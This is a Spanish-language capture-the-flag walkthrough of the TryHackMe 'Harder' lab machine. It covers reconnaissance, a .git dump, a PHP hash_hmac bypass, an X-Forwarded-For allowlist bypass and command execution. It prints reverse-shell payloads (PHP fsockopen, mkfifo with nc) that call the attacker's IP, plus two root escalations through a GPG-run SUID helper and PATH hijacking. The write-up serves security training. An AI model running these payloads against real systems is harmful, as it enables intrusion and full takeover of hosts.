## TryHackMe  <> Harder

![image](https://github.com/Esevka/CTF/assets/139042999/3ea2cca3-c8e7-4fcf-84d8-2d880db182e5)

Enunciado Informacion : There is a second way to get root access without using any key

---
---

## Escaneo de puertos

Lanzamos una traza ICMP(ping) para ver si la maquina esta activa, segun el ttl obtenido, por proximidad al valor 64(LINUX) podriamos decir que es una maquina Linux.

    ┌──(root㉿kali)-[/home/…/Desktop/ctf/harder/nmap]
    └─# ping 10.10.54.78 -c1
    PING 10.10.54.78 (10.10.54.78) 56(84) bytes of data.
    64 bytes from 10.10.54.78: icmp_seq=1 ttl=63 time=73.5 ms
    
    --- 10.10.54.78 ping statistics ---
    1 packets transmitted, 1 received, 0% packet loss, time 0ms
    rtt min/avg/max/mdev = 73.542/73.542/73.542/0.000 ms

Reporte Nmap (Obtenemos puertos abiertos servicios y versiones que estan corriendo.)

    ┌──(root㉿kali)-[/home/…/Desktop/ctf/harder/nmap]
    └─# nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.54.78 -vvv -oN open_ports                  
    Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-26 13:03 CEST
    Initiating SYN Stealth Scan at 13:03
    Scanning 10.10.54.78 [65535 ports]
    Discovered open port 22/tcp on 10.10.54.78
    Discovered open port 80/tcp on 10.10.54.78
    Completed SYN Stealth Scan at 13:04, 24.15s elapsed (65535 total ports)
    Nmap scan report for 10.10.54.78
    Host is up, received user-set (0.068s latency).
    Scanned at 2023-07-26 13:03:57 CEST for 24s
    Not shown: 41750 closed tcp ports (reset), 23783 filtered tcp ports (no-response)
    Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
    PORT   STATE SERVICE REASON
    22/tcp open  ssh     syn-ack ttl 62
    80/tcp open  http    syn-ack ttl 62
    
    Read data files from: /usr/bin/../share/nmap
    Nmap done: 1 IP address (1 host up) scanned in 24.26 seconds
               Raw packets sent: 117285 (5.161MB) | Rcvd: 48663 (1.947MB)


    ┌──(root㉿kali)-[/home/…/Desktop/ctf/harder/nmap]
    └─# nmap -p 22,80 -sCV 10.10.54.78 -vvv -oN info_ports                        
    Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-26 13:07 CEST

    PORT   STATE SERVICE REASON         VERSION
    22/tcp open  ssh     syn-ack ttl 62 OpenSSH 8.3 (protocol 2.0)
    | ssh-hostkey: 
    |   4096 cfe2d927d2d9f3f78e5dd2f99da4fb66 (RSA)
    | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCns4FcsZGpefUl1pFm7KRPBXz7nIQ590yiEd6aNm6DEKKVQOUUT4TtSEpCaUhnDU/+XHFBJfXdm73tzEwCgN7fyxmXSCWDWu1tC1zui3CA/sr/g5k+Az0u1yTvoc3eUSByeGvVyShubpuCB5Mwa2YZJxiHu/WzFrtDbGIGiVcQgLJTXdXE+aK7hbsx6T9HMJpKEnneRvLY4WT6ZNjw8kfp6oHMFvz/lnDffyWMNxn9biQ/pSkZHOsBzLcAfAYXIp6710byAWGwuZL2/d6Yq1jyLY3bic6R7HGVWEX6VDcrxAeED8uNHF8kPqh46dFkyHekOOye6TnALXMZ/uo3GSvrJd1OWx2kZ1uPJWOl2bKj1aVKKsLgAsmrrRtG1KWrZZDqpxm/iUerlJzAl3YdLxyqXnQXvcBNHR6nc4js+bJwTPleuCOUVvkS1QWkljSDzJ878AKBDBxVLcFI0vCiIyUm065lhgTiPf0+v4Et4IQ7PlAZLjQGlttKeaI54MZQPM53JPdVqASlVTChX7689Wm94//boX4/YlyWJ0EWz/a0yrwifFK/fHJWXYtQiQQI02gPzafIy7zI6bO3N7CCkWdTbBPmX+zvw9QcjCxaq1T+L/v04oi0K1StQlCUTE12M4fMeO/HfAQYCRm6tfue2BlAriIomF++Bh4yO73z3YeNuQ==
    |   256 1e457b0ab5aa87e61bb1b79f5d8f8570 (ED25519)
    |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB+INGLWU0nf9OkPJkFoW9Gx2tdNEjLVXHrtZg17ALjH
    80/tcp open  http    syn-ack ttl 62 nginx 1.18.0
    |_http-server-header: nginx/1.18.0
    | http-methods: 
    |_  Supported Methods: GET HEAD POST
    |_http-title: Error
    
## Analisis de puertos y servicios

Empezamos fuzzeando puerto 80
        
    ┌──(root㉿kali)-[/home/kali/Desktop/ctf/harder]
    └─# gobuster dir -u http://10.10.54.78/ -w /usr/share/wordlists/dirb/common.txt -o fuzz --exclude-length 1985

    /.git/HEAD            (Status: 403) [Size: 153]
    /phpinfo.php          (Status: 200) [Size: 86507]
    /vendor               (Status: 301) [Size: 169] [--> http://10.10.54.78:8080/vendor/]


    /.git el cual podriamos hacer un dump de dicha carpeta pero no tenemos acceso al recurso --> http status 403
    
    /phpinfo.php nos muestra el tipico phpinfo donde podemos ver toda la configuracion del php, Interesante lo dejamos de mommento.
    
    /vendor este directorio nos hace una redireccion al puerto 8080 tiene un http status 301



Con burpsuite vamos a interceptar la conexion para ver las respuesta del servidor y ver si encontramos algo.

![image](https://github.com/Esevka/CTF/assets/139042999/4ebb3396-b12a-4c44-8487-ffcc249756f9)

Como vemos en la imagen la variable Set-Cookie muestra datos interesantes, anadimos el dominio a nuestro fichero hosts para que nos realize la resolucion del dominio y ver si a traves de virtual hosting nos muestra cositas diferentes la web.

TestCookie=just+a+test+cookie
domain=pwd.harder.local

    ┌──(root㉿kali)-[/home/kali/Desktop/ctf/harder]
    └─# cat /etc/hosts

    10.10.54.78     pwd.harder.local

Accedermos a la web

![image](https://github.com/Esevka/CTF/assets/139042999/1fc66d1c-a925-4138-bc7b-fc1e04fe13dc)

![image](https://github.com/Esevka/CTF/assets/139042999/a912ced3-8d0a-4a43-ae25-a5b73d44c7c6)

Despues de revisar el codigo de la web y probar varias credenciales por defecto(admin:admin,admin:1234 ...) lo unico que conseguimos es el siguiente mensaje, el cual ya no nos permite volver a cargar el login.

	extra security in place. our source code will be reviewed soon ...

Por lo que vamos a fuzzear el dominio en busca de directorios.

    ┌──(root㉿kali)-[/home/kali/Desktop/ctf/harder]
    └─# gobuster dir -u http://pwd.harder.local/ -w /usr/share/wordlists/dirb/common.txt -o fuzz_dominio  
 
    /.git/HEAD            (Status: 200) [Size: 23]
    /index.php            (Status: 200) [Size: 19926]

Como vemos el directorio /.git que antes no teniamos acceso, a traves del dominio nos entrega un http status 200 por lo que tenemos acceso a el y podemos realizar un dumpeo.


Para dumpear el directorio /.git vamos a utlizar la herramienta git-dumper. Enlace --> https://github.com/arthaud/git-dumper

    ┌──(root㉿kali)-[/home/kali/Desktop/ctf/harder]
    └─# git-dumper http://pwd.harder.local/.git/ dump_git                                            
    [-] Testing http://pwd.harder.local/.git/HEAD [200]
    [-] Testing http://pwd.harder.local/.git/ [403]
    [-] Fetching common files
    ...

Ficheros obtenidos despues del dumpeo.

    ┌──(root㉿kali)-[/home/…/Desktop/ctf/harder/dump_git]
    └─# ls
    auth.php  hmac.php  index.php

Analizamos los ficheros, estos tres ficheros son los encargador del panel de login encontrado anteriormente.

    index.php --> require (auth.php,hmac.php y credentials.php), el fichero credentials.php no lo tenemos.

	auth.php --> es el fichero que procesa todo. el formulario de login.

	hmac.php --> este fichero es el interesante lo podemos bypasear, utiliza una funciona hash_hmac.

Enlace funcion hash_mac --> https://www.php.net/manual/es/function.hash-hmac.php)


## Bypass funcion hash_mac PHP

Fichero hmac.php, lo esplicaremos por secciones.

	<?php
		(1)
		 if (empty($_GET['h']) || empty($_GET['host'])) 
		 {
			header('HTTP/1.0 400 Bad Request');
			print("missing get parameter");
			die();
		}
		require("secret.php"); //set $secret var
		
		(2)
		if (isset($_GET['n'])) 
		{
			$secret = hash_hmac('sha256', $_GET['n'], $secret);
		}
		
		$hm = hash_hmac('sha256', $_GET['host'], $secret);
		
		(3)
		if ($hm !== $_GET['h'])
		{
			header('HTTP/1.0 403 Forbidden');
			print("extra security check failed");
			die();
		}
	?>

 (1) if --> comprueba si las variables h o host estan vacias, por lo que son necesarias en nuestra url si  queremos saltar el primer if.
 	Si enviamos las variables vacias entraremos en el if como nos muestra el ejemplo.
 
 	http://pwd.harder.local/index.php?h=''&host=''
  
![image](https://github.com/Esevka/CTF/assets/139042999/ab0be6a5-dc8b-453f-8f92-f0b722ce1f49)

(2) if --> comprueba que existe la variable n, para almacenar el resultado de la funcion hash_mac en la variable $secrets, que posteriormente sera utilizada en el (3)if como key de la funcion hash_mac, por lo que nuestra url debe tener la variable n tambien.

	http://pwd.harder.local/index.php?h=''&host=''&n=''

Estructura funcion hash_mac ---> hash_hmac(algoritmo,data,key)

	algoritmo	-> algoritmo para cifrar.
	data		-> Mensaje para cifrar.
	key 		-> Clave secreta compartida que se usará para generar el mensaje cifrado.

			
(3) if --> comprueba que tanto la variable $hm(resultado de la funciona hash_mac donde utiliza domo data la variable host y como key la variable $secret resultado de la funciona hach_mac del (2) if),como la varialbe h que pasamos por la url sean iguales tanto en tipo como en valor.

Explicacion del bypass.

 -En la funciona hash_mac la data que espera debe ser string, pero si le pasamos en vez de un string un array de datos esta funcion se rompe devolviendo como resultado ===false===, por lo que nuestra 	variable $secret=false, controlando esta variable que es la key  y la variable host que la introducimos nosotros podremos bypasear la funciona

	 $hm = hash_hmac('sha256', $_GET['host'], $secret);
		
		if ($hm !== $_GET['h'])
			

Info Bypass--> https://www.securify.nl/blog/spot-the-bug-challenge-2018-warm-up/

Preparamos nuestra carga

	Valor que que introduciremos en la variable h

		<?php
			echo hash_hmac('sha256','esevka',false);
		?>

		h=c36f9d28c5f2b9f77d47e6862f1b8af43a50ae3c0b2a20c235032bf4b03bf2c9

Url modificada para bypasear la funcion

		http://pwd.harder.local/index.php?h=c36f9d28c5f2b9f77d47e6862f1b8af43a50ae3c0b2a20c235032bf4b03bf2c9&host=esevka&n[]=

Al ejecutar la url, la web nos devulve un resultado muy interesante.

	url 				username 	password (cleartext)
	http://shell.harder.local 	evs 		9FRe8VUuh----Wn0e9RfSGv7xm

## Explotando Nuevo dominio encontrado.

Anadimos dicho dominio encontrado a nuestro fichero /etc/hosts.

	┌──(root㉿kali)-[/home/kali/Desktop/ctf/harder]
	└─# cat /etc/hosts                                                  
	10.10.29.10     pwd.harder.local shell.harder.local

Accedemos a la url y nos logueamos con las credenciales que hemos encontrado.
 
	http://shell.harder.local

![image](https://github.com/Esevka/CTF/assets/139042999/23ce76ce-d482-4827-87aa-11632e7bbeee)

Obtenemos el siguiente mensaje de la web una vez logueados.

	Your IP is not allowed to use this webservice. Only 10.10.10.x is allowed

Como nos dice que solo estan permitidas las ips 10.10.10.xx, vamos a hacer uso de burpsuite  para interceptar la request y modificar la cabecera de esta anadiendole el valor X-Forwarded-For con una ip valida y ver si podemos saltarnos esta prohibicion.

	 La cabecera X-Forwarded-For (XFF) es un estándar para identificar el origen de la dirección IP de un cliente conectado a un servidor web a través de un proxy HTTP o un balanceador de carga.
	
![image](https://github.com/Esevka/CTF/assets/139042999/2626e33e-bd2d-41fc-b4e7-ce90378d507d)

Esto nos permite poder visualizar la pagina correctamente, mostrandonos un form que nos permite ejecutar comandos del sistema RCE.

	<form method="POST">
		<div class="form-group">
			<label for="cmd"><strong>Command</strong></label>
			<input type="text" class="form-control" name="cmd" id="cmd" value="" required>                
		</div>
		<button type="submit" class="btn btn-primary">Execute</button>
        </form>

Analizamos el form y vemos que mediante el metodo POST envia una variable cmd que es igualada al comando que queremos ejecutar, editamos la request para poder ejecutar comandos.

![image](https://github.com/Esevka/CTF/assets/139042999/4d122698-0e14-4bb2-bc14-449ceb54227b)

Hemos conseguido ejecutar comandos en la maquina victima, response de nuestra request modificada.

	       <div class="pb-2 mt-4 mb-2">
            		<h2> Output </h2>
        	</div>
        	<pre>
			auth.php
			index.php
			ip.php
			vendor
        	</pre>


## Obtenemos Reverse Shell

Nos ponemos en escucha para recibir la shell

	┌──(root㉿kali)-[/home/…/Desktop/ctf/harder/dump_git]
	└─# nc -lnvp 1988  
	listening on [any] 1988 ...

 Generamos la reverse shell, esta debe ir url encode, en caso contrario no funcionara.

 	cmd=php -r '$sock=fsockopen("10.18.54.226",1988);exec("bash <&3 >&3 2>&3");';

	cmd=php%20-r%20%27%24sock%3Dfsockopen%28%2210.18.54.226%22%2C1988%29%3Bpopen%28%22bash%20%3C%263%20%3E%263%202%3E%263%22%2C%20%22r%22%29%3B%27;

Cuando ejecutamos la reverse shell nos da un error, indicandonos que no encuentra bash, por lo que cambiaremos a sh y todo resuelto.

	cmd=php%20-r%20%27%24sock%3Dfsockopen%28%2210.18.54.226%22%2C1988%29%3Bpopen%28%22sh%20%3C%263%20%3E%263%202%3E%263%22%2C%20%22r%22%29%3B%27;

## Flag user.txt

	┌──(root㉿kali)-[/home/kali/Desktop/ctf/harder]
	└─# nc -lnvp 1988
	listening on [any] 1988 ...
	connect to [10.18.54.226] from (UNKNOWN) [10.10.29.10] 38050
	whoami
	www
 
	ls -la /home/www
	total 8
	drwxr-sr-x    2 www      www           4096 Jul  7  2020 .
	drwxr-xr-x    1 root     root          4096 Jul  7  2020 ..
 
	ls -la /home/evs
	total 12
	drwxr-sr-x    1 evs      evs           4096 Jul  7  2020 .
	drwxr-xr-x    1 root     root          4096 Jul  7  2020 ..
	-rw-r--r--    1 evs      evs             33 Jul  6  2020 user.txt
 
 	cat /home/evs/user.txt
	FLAG[---user.txt---]

## Post Explotacion Escalada de privilegios usuario www to evs.

Despues de un buen rato enumerando y buscando, encontramos un script perteneniente al usuario www.

	find / -user www 2>/dev/null

		/etc/periodic/15min/evs-backup.sh

Bingo el script trae sorpresa credenciales para conectarnos por ssh  con el usuario evs

	cat /etc/periodic/15min/evs-backup.sh
	#!/bin/ash
	
	# ToDo: create a backup script, that saves the /www directory to our internal server
	# for authentication use ssh with user "evs" and password "U6j1brxGqbsU-------uIodnb$SZB4$bw14"

 Mediante estas credenciales podemos realizar un movimiento lateral del usuario www a evs, el cual tiene mayores privilegios sobre la maquina.
 Nos logueamos en el servico ssh puerto 22 que encontramos en la enumeracion de puertos
 
	┌──(root㉿kali)-[/home/kali]
	└─# ssh evs@shell.harder.local
	evs@shell.harder.local's password: 
	Welcome to Alpine!
	
	The Alpine Wiki contains a large amount of how-to guides and general
	information about administrating Alpine systems.
	See <http://wiki.alpinelinux.org/>.
	
	You can setup the system with the command: setup-alpine
	
	You may change this message by editing /etc/motd.
	
	harder:~$ whoami
	evs

## Post Explotacion Escalada de privilegios usuario evs to root.

Existen dos metodos para llegar a ser root desde el usuario evs.

### Metodo 1: Mediante firma GNU Privacy Guard (GPG)

--Buscamos binarios que tengan el SUID activo

	harder:~$ find / -perm -4000 2>/dev/null | xargs ls -la
 
	-rwsr-x---    1 root     evs          19960 Jul  6  2020 /usr/local/bin/execute-crypted  
	
--Con el comando strings intentamos ver si encontramos algo dentro del binario que nos sea de utilidad, encontramos un script dentro de la misma ruta del binario.

	harder:/usr/local/bin$ strings execute-crypted 
 
		/usr/local/bin/run-crypted.sh %s
		/usr/local/bin/run-crypted.sh

 	harder:/usr/local/bin$ ls -la
		total 32
		drwxr-xr-x    1 root     root          4096 Jul  7  2020 .
		drwxr-xr-x    1 root     root          4096 May 29  2020 ..
		-rwsr-x---    1 root     evs          19960 Jul  6  2020 execute-crypted
		-rwxr-x---    1 root     evs            412 Jul  7  2020 run-crypted.sh

  --Contenido de run-crypted.sh 

		harder:/usr/local/bin$ cat run-crypted.sh 
			#!/bin/sh

			if [ $# -eq 0 ]
			then
				 echo -n "[*] Current User: ";
				 whoami;
				 echo "[-] This program runs only commands which are encypted for root@harder.local using gpg."
				 echo "[-] Create a file like this: echo -n whoami > command"
				 echo "[-] Encrypt the file and run the command: execute-crypted command.gpg"
			else
				export GNUPGHOME=/root/.gnupg/
				gpg --decrypt --no-verbose "$1" | ash
			fi

Dicho script lo que hace es desencriptar y ejecutar el fichero(que contine instrucciones) firmado con la firma root@harder.local, que posteriormente sera ejecutado de la siguiente manera

	execute-crypted command.gpg

---
Para llevar a cabo este proceso necesitamos la firma de root, firmaremos nuestro fichero para que el script pueda ejecutar nuestras instrucciones como root y llevar a elevar privilegios.
---


--Buscamos la fimar en la maquina, tenemos permisos de lectura y ejecucion sobre la firma ya que pertenecemos al grup evs.

	harder:/usr/local/bin$ find / -name '*root@harder*' 2>/dev/null | xargs ls -la
		-rwxr-x---    1 root     evs            641 Jul  7  2020 /var/backup/root@harder.local.pub

Paso 1-Importamos la firma encontrada mediante gpg

	harder:/usr/local/bin$ gpg --import /var/backup/root@harder.local.pub; gpg --list-keys
 
		gpg: key C91D6615944F6874: public key "Administrator <root@harder.local>" imported
		gpg: Total number processed: 1
		gpg:               imported: 1
		/home/evs/.gnupg/pubring.kbx
		----------------------------
		pub   ed25519 2020-07-07 [SC]
		      6F99621E4D64B6AFCE56E864C91D6615944F6874
		uid           [ unknown] Administrator <root@harder.local>
		sub   cv25519 2020-07-07 [E]

								
Paso 2-Creamos el fichero que firmaremos como root el cual nos devolvera una reverse shell como usuario root.

 Recordamos que tenemos que cambiar de bash a sh.
 
	harder:/tmp$ echo -n 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.18.54.226 1988 >/tmp/f' > command
 
Paso 3-Firmamos y encryptamos el fichero command.

	harder:/tmp$ gpg --encrypt --recipient root@harder.local command 
		gpg: 6C1C04522C049868: There is no assurance this key belongs to the named user
		
		sub  cv25519/6C1C04522C049868 2020-07-07 Administrator <root@harder.local>
		 Primary key fingerprint: 6F99 621E 4D64 B6AF CE56  E864 C91D 6615 944F 6874
		      Subkey fingerprint: E51F 4262 1DB8 87CB DC36  11CD 6C1C 0452 2C04 9868
		
		It is NOT certain that the key belongs to the person named
		in the user ID.  If you *really* know what you are doing,
		you may answer the next question with yes.
		
		Use this key anyway? (y/N) y
  
  
		harder:/tmp$ ls -la         
			total 36
			drwxrwxrwt    1 root     root          4096 Jul 27 08:34 .
			drwxr-xr-x    1 root     root          4096 Jul  7  2020 ..
			-rw-r--r--    1 evs      evs             79 Jul 27 08:28 command
			-rw-r--r--    1 evs      evs            225 Jul 27 08:34 command.gpg -----------> aqui tenemos nuestro fichero preparado.

 
Paso 4-Ejecutamos el binario para obtener nuestra reverse shell como root.

Nos ponemos en escucha preparados para recibir la shell y obtener la flag.

	┌──(root㉿kali)-[/home/kali/Desktop/ctf/harder]
	└─# nc -lnvp 1988      
		listening on [any] 1988 ...
		connect to [10.18.54.226] from (UNKNOWN) [10.10.123.120] 36177
		
  		harder:/tmp# whoami
		root
  
		harder:/tmp# cd /root
  
		harder:/root# ls -la
		total 24
		drwx------    1 root     root          4096 Jul  7  2020 .
		drwxr-xr-x    1 root     root          4096 Jul  7  2020 ..
		lrwxrwxrwx    1 root     root             9 Jul  7  2020 .ash_history -> /dev/null
		drwx------    1 root     root          4096 Jul 27 08:46 .gnupg
		-rwx------    1 root     root            33 Jul  6  2020 root.txt
  
		harder:/root# cat root.txt
		3a7bd726--------09f0566935a6c

	
Ejecutamos el binario para que realize todo el proceso.

	harder:/tmp$ /usr/local/bin/execute-crypted command.gpg 
		gpg: encrypted with 256-bit ECDH key, ID 6C1C04522C049868, created 2020-07-07
		      "Administrator <root@harder.local>"
	
---
---> Maquina Harder completa Metodo 1 <---
---
---


### Metodo 2: Mediante Ataque Relative PATH

--Vemos que el script ejecuta el comando whoami para mostrar el nombre de usuario que ejecuta el script, haciendo uso de la variable PATH del sistema, no utiliza su ruta absoluta /usr/bin/whoami.	

	 harder:/usr/local/bin$ cat run-crypted.sh 
		#!/bin/sh
		
		if [ $# -eq 0 ]
		  then
		    echo -n "[*] Current User: ";
	  ***====>  whoami;
		    echo "[-] This program runs only commands which are encypted for root@harder.local using gpg."
		    echo "[-] Create a file like this: echo -n whoami > command"
		    echo "[-] Encrypt the file and run the command: execute-crypted command.gpg"
		  else
		    export GNUPGHOME=/root/.gnupg/
		    gpg --decrypt --no-verbose "$1" | ash
		fi
  
	harder:/usr/local/bin$ run-crypted.sh 
		[*] Current User: evs  <=============*******
		[-] This program runs only commands which are encypted for root@harder.local using gpg.
		[-] Create a file like this: echo -n whoami > command
		[-] Encrypt the file and run the command: execute-crypted command.gpg

---	
Por lo que vemos podemos crear un binario llamado "whoami" en el directorio /tmp que contenga una reverse shell y seguidamente anadir al inicio del  PATH la ruta tmp: , cuando se ejecute el script e intente ejecutar el comando whoami este buscara en la variable PATH del sistema de manera ordenada, encontrara primero nuestro binario whoami situado en /tmp  ejecutando asi la reverse shell como root, en teoria.
---

--Creamos el binario en tmp y damos permiso de ejecucion

	harder:/usr/local/bin$ echo -n 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.18.54.226 1988 >/tmp/f' > /tmp/whoami

	harder:/usr/local/bin$ chmod 777 /tmp/whoami 

 --Modificamos el PATH

	harder:/tmp$ echo $PATH
		/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
 
	harder:/tmp$ export PATH=/tmp:$PATH
 
	harder:/tmp$ echo $PATH
		/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

  --Nos ponemos en escucha preparados para recibir la shell y obtener la flag.

	┌──(root㉿kali)-[/home/kali/Desktop/ctf/harder]
	└─# nc -lnvp 1988
	listening on [any] 1988 ...
	connect to [10.18.54.226] from (UNKNOWN) [10.10.123.120] 35677
 
		harder:/tmp# id
		uid=0(root) gid=1000(evs) groups=1000(evs)

--Ejecutamos el binario para que realize todo el proceso.

	harder:/tmp$ /usr/local/bin/execute-crypted 
	[*] Current User:
	
---
---> Maquina Harder completa Metodo 2 <---
---
---





